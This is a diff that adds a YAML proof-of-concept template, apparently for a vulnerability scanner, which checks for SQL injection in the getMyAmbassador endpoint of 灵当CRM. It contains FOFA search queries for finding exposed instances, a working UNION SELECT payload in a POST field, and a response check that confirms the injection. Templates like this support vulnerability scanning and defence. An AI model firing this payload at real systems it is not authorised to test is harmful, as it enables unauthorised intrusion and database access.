@@ -1,0 +1,30 @@
+id: poc-yaml-51mis-crm-getmyambassador-sqli
+info:
+  name: 灵当CRM getMyAmbassador SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 灵当CRM
+  fofa_1: body="crmcommon/js/jquery/jquery-1.10.1.min.js"
+  fofa_2: body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /crm/WeiXinApp/marketing/index.php?module=Ambassador&action=getMyAmbassador
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: logincrm_userid=-1 union select md5({{.t1}}),2,3#
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"last_name\":") &&
+
+    contains(body,t2) &&
+
+    contains(body,"\"crm_user_id\":") &&
+
+    !contains(body,"<")
+
+    '
+transport: http
